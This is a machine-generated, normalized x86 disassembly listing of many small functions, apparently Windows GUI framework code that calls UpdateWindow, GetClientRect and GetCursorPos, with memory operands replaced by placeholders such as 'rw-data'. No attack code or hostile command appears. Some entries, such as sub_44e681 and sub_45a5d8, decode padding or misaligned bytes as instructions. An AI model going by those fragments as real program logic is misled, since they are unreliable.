test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_44be34
retn
sub_44be38
mov eax [ rw-data ]
retn
sub_44be40
retn
sub_44be6e
jmp sub_4037e4
sub_44be73
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46e56c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44be90
call sub_40355c
xor eax eax
mov [ rw-data ] eax
retn
sub_44bea0
call sub_403558
xor eax eax
mov [ rw-data ] eax
retn
sub_44beb0
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403668
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44bf60
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_44bf78
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_44bfc4
retn
sub_44c17c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403518
pop esi
retn
sub_44c190
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403518
pop esi
retn
sub_44c1a4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_44c1b0
mov eax 0x4
retn
sub_44c1b8
retn
sub_44cda9
jmp sub_4037e4
sub_44d096
jmp sub_403a98
sub_44d108
jmp sub_403a98
sub_44d114
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_44ce3c
sub_44d293
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4259c4
retn
sub_44d2a9
jmp sub_403a98
sub_44d2d0
jmp sub_403a98
sub_44d352
jmp sub_403a98
sub_44d37a
jmp sub_403a98
sub_44d381
mov esp ebp
pop ebp
retn
sub_44d439
jmp sub_403a98
sub_44d490
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44d45c
mov [ ebx + 0x58 ] esi
sub_44d5e4
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_44d5f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034cc
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44d6e1
jmp sub_403a98
sub_44d6e8
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d76b
jmp sub_403a98
sub_44d772
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_44db40
xor eax eax
retn
sub_44db44
mov al [ eax + 0x58 ]
retn
sub_44db48
xor eax eax
retn
sub_44db4c
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_44db54
mov eax [ eax + 0x30 ]
retn
sub_44dbf8
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_44dca4
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_44dcbc
mov [ eax + 0x5d ] dl
retn
sub_44dcc0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_4518b8
sub_44dcd0
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_44e1b3
jmp sub_403a98
sub_44e1ba
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e21c
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_44e2a0
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_44e3bd
jmp sub_403a98
sub_44e3c4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e4c0
push eax
xor ecx ecx
mov edx 0xb037
call sub_44fa80
retn
sub_44e681
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403518
sub_44e732
jmp sub_403a98
sub_44e739
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44e810
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_44fa80
sub_44e828
push 0x0
xor ecx ecx
mov edx 0xe
call sub_44fa80
retn
sub_44e838
push edx
mov edx 0xd
call sub_44fa80
retn
sub_44e844
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_44e858
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_44e939
jmp sub_403a98
sub_44e940
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e948
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_44fa80
sub_44e9b8
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_44e9cc
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_44e9d8
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_44e9e0
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_44fa80
sub_44ea04
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_44fa80
sub_44ea28
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_44fa80
sub_44ea70
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_44ea78
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_44fa80
sub_44ea9c
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_44fa80
sub_44eac0
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_44fa80
sub_44eadc
push ebx
mov ebx eax
call sub_44ba5c
cmp ebx eax
sete al
pop ebx
retn
sub_44eb14
push esi
mov dl 0x1
mov si 0xffce
call sub_403518
pop esi
retn
sub_44ec5e
jmp sub_403a98
sub_44ec65
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ed88
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_44ecfc
retn
sub_44eddc
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_44edf0
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_44eed5
jmp sub_403a98
sub_44eef4
xor eax eax
retn
sub_44eef8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44ef10
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44ef28
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_44ef40
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_44ef5c
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_44ef74
retn
sub_44f038
retn
sub_44f03c
cmp eax [ rw-data ]
sete al
retn
sub_44f0b0
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_44f1cc
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403518
pop esi
pop ebp
retn 0x4
sub_44f20c
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_44f4a3
jmp sub_403a98
sub_44f4aa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f4b4
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403518
pop esi
retn
sub_44f4c8
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403518
pop esi
retn
sub_44f797
jmp sub_403a98
sub_44f840
push esi
mov si 0xffee
call sub_403518
pop esi
retn
sub_44f84c
mov al 0x1
retn
sub_44fb24
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_44df08
retn
sub_44fb48
retn
sub_44fd61
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41cd04
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_44fd7c
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41f1bc
retn
sub_44fe74
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_4502bb
or ecx [ ebx - 0x1441993d ]
sub_45048c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_450494
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_45049c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_450554
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_450574
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_44ea04
mov [ ebx + 0x9a ] 0x1
sub_4505cc
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_44e9a8
mov [ ebx + 0x56 ] 0x1
sub_4505f0
mov [ edx + 0xc ] 0x1
retn
sub_4505f8
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_44fa80
sub_450610
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_44fa80
sub_450628
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_45088e
jmp sub_403a98
sub_450895
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4508c0
mov eax [ r-xdata ]
retn
sub_450a5c
jmp sub_403a98
sub_450a63
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450b84
mov eax [ eax + 0xb8 ]
retn
sub_450bec
push ebx
mov ebx eax
mov eax ebx
call sub_44ef10
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_450c08
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_450da0
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_450dd0
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_450dd8
call sub_44d974
retn
sub_450ed8
jmp sub_403a98
sub_451098
jmp sub_403a98
sub_4510e8
jmp sub_403a98
sub_451120
retn
sub_4513a9
jmp sub_403a98
sub_451531
jmp sub_403a98
sub_451893
jmp sub_403a98
sub_45193f
jmp sub_403a98
sub_45194c
inc [ eax + 0x160 ]
retn
sub_451954
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_451974
sub_451974
xor edx edx
call sub_4518b8
retn
sub_451a41
jmp sub_403a98
sub_451a48
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451b37
jmp sub_403a98
sub_45205e
jmp sub_403a98
sub_452065
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45222d
jmp sub_403a98
sub_452234
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452308
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4524f5
jmp sub_403a98
sub_4524fc
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_4525ec
xor eax eax
retn
sub_452654
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_44fa80
sub_452782
jmp sub_4037e4
sub_4528b7
jmp sub_403a98
sub_4528be
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4528c8
jmp sub_4037e4
sub_4528cd
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46e56c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_452e88
jmp sub_403a98
sub_452e8f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452e98
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_453396
jmp sub_403a98
sub_4533e8
push ebx
mov ebx eax
call sub_424154
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_44fa80
pop ebx
retn
sub_453404
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_44fa80
retn
sub_453418
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_44fa80
retn
sub_453428
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_44fa80
retn
sub_4536d4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4553c4
pop esi
retn
sub_4537e8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_453838
pop esi
retn
sub_4537fc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_453924
pop esi
retn
sub_453810
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_453824
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_453917
jmp sub_403a98
sub_45391e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4539ae
jmp sub_403a98
sub_4539b5
pop ebx
pop ecx
pop ebp
retn
sub_4539bc
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_4539cc
retn
sub_4539d0
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_4539f0
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_453b50
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_453c20
retn
sub_453d38
jmp sub_403a98
sub_453d3f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453e0a
jmp sub_403a98
sub_453e34
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_453ec6
jmp sub_403a98
sub_454098
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_45433c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_454418
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_451e44
pop esi
retn
sub_4544dc
push esi
mov si 0xffc1
call sub_403518
pop esi
retn
sub_454508
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_45451c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_454530
call sub_451e04
retn
sub_454538
call sub_451e04
retn
sub_454540
call sub_451e04
retn
sub_4545e8
push ebx
mov ebx eax
mov eax ebx
call sub_45049c
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_4252cc
mov dx 0xb009
mov eax ebx
call sub_451e44
pop ebx
retn
sub_45474c
call sub_451e04
retn
sub_454754
call sub_451e04
retn
sub_45475c
call sub_451e04
retn
sub_454764
call sub_451e04
retn
sub_4547c8
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_454c5e
jmp sub_403a98
sub_454c65
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454d44
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_454ee8
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_44fa80
retn
sub_454f88
push ebx
mov ebx eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_454fa4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_45517c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_4550b4
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_4551d4
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44fa80
sub_4551f4
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_44fa80
sub_455218
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_455224
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_44fa80
sub_4552d0
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_455274
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_4553ac
jmp sub_403a98
sub_4553b3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4555d2
jmp sub_403a98
sub_4555d9
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4556e0
call sub_44f850
retn
sub_455b2e
jmp sub_403a98
sub_455bc4
mov eax [ r-xdata ]
retn
sub_455d2b
jmp sub_403a98
sub_455e3c
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44fa80
sub_455e5c
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44fa80
sub_456172
jmp sub_403a98
sub_4562b4
test [ eax + 0x52 ] 0x4
setne al
retn
sub_456410
jmp sub_403a98
sub_456417
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4259c4
retn
sub_456433
jmp sub_403a98
sub_456440
retn
sub_456514
mov [ edx + 0xc ] 0xffffffff
retn
sub_456572
jmp sub_403a98
sub_456579
pop ecx
pop ecx
pop ebp
retn
sub_456619
jmp sub_403a98
sub_456620
pop ebx
mov esp ebp
pop ebp
retn
sub_45668c
call sub_45260c
retn
sub_45671f
jmp sub_403a98
sub_456726
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_456905
jmp sub_403a98
sub_45690c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456a68
push ebx
mov ebx eax
mov eax ebx
call sub_45ba3c
or edx 0xffffffff
mov eax ebx
call sub_456b94
pop ebx
retn
sub_456b40
jmp sub_403a98
sub_456b94
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_456a80
sub_456d04
push ebx
mov ebx eax
mov eax ebx
call sub_45baf4
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_456d1c
push ebx
mov ebx eax
mov eax ebx
call sub_45baf4
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_456e08
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_453244
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_456ea3
jmp sub_403a98
sub_456eaa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456ecd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4259c4
retn
sub_456ec6
jmp sub_403a98
sub_456ecd
pop ebx
pop ecx
pop ebp
retn
sub_456ed4
retn
sub_456f3c
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_4572a9
jmp sub_403a98
sub_457490
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_45767c
jmp sub_403a98
sub_45772c
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_457740
inc [ eax + 0x6c ]
retn
sub_457744
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_458fc4
sub_4578a4
call sub_457fa4
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_45824f
jmp sub_403a98
sub_458256
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458273
lea eax [ ebp - 0xc ]
call sub_404118
retn
sub_45826c
jmp sub_403a98
sub_458273
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458554
jmp sub_403a98
sub_45855b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458578
mov eax [ ebp - 0x4 ]
call sub_4259c4
retn
sub_458571
jmp sub_403a98
sub_458578
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458595
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_45858e
jmp sub_403a98
sub_458595
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458a49
jmp sub_403a98
sub_458a50
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458bdb
jmp sub_403a98
sub_458be2
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_458c97
jmp sub_403a98
sub_458c9e
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_458d8c
jmp sub_403a98
sub_458ddd
jmp sub_403a98
sub_458de4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458ea0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4577b0
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_458fec
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_4572ec
sub_4598ec
jmp sub_403a98
sub_4598f3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4599bc
call GetCapture
retn
sub_4599c4
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40d354
pop ebx
retn
sub_4599d4
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_459c3a
jmp sub_403a98
sub_459e34
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_45a048
jmp sub_403a98
sub_45a04f
pop ebx
mov esp ebp
pop ebp
retn
sub_45a09a
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_45a117
jmp sub_403a98
sub_45a11e
pop ebp
retn
sub_45a1a6
jmp sub_403a98
sub_45a1ad
pop ebp
retn
sub_45a5d8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_45a938
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_418d54
retn
sub_45a950
mov al 0x1
retn
sub_45a954
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_421eac
retn
mov eax edx
retn
sub_45a964
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_421e7c
retn
mov al 0x1
retn
sub_45ac54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418cf8
pop esi
pop ebx
retn
sub_45ac68
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_45aca4
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_45af08
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
pop ebx
retn
sub_45af1c
push ebx
